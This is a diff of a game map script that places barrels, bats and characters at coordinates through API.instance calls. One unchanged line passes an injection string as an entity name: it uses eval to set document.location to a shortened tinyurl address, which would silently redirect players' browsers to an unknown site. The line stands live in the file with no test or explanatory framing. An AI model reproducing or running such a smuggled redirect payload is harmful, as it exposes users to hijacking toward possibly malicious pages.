@@ -24,9 +24,27 @@ API.add_warp(127, 0, 128, 128, 2, 67, "start1.json");
 API.add_warp(0, 0, 1, 128, 126, 39, "start1.json");
 
 
+// add some barrels
+API.instance("barrel", 96, 55);
+API.instance("barrel", 25, 86);
+API.instance("barrel", 27, 86);
+API.instance("barrel", 26, 87);
+API.instance("barrel", 30, 87);
+API.instance("barrel", 87, 46);
+// by the pub
+API.instance("barrel", 44, 92);
+API.instance("barrel", 44, 90);
+API.instance("barrel", 44, 91);
 
-// add some stuff
-//API.instance("barrel", 96,55);
+
+// barrels corresponding to tiles
+// by the inn
+API.instance("barrel", 92, 26);
+API.instance("barrel", 92, 22);
+API.instance("barrel", 92, 20);
+// by the library
+API.instance("barrel", 36, 58);
+API.instance("barrel", 36, 56);
 
 
 // add some characters
@@ -34,3 +52,7 @@ API.instance("alice", 86, 54);
 API.instance("$; eval('document.location=\"http://tinyurl.com/y8ufsnp\";');", 81, 36);
 
 API.instance("bat", 104, 46);
+API.instance("bat", 119, 26);
+API.instance("bat", 40, 68);
+API.instance("bat", 20, 47);
+API.instance("bat", 16, 95);
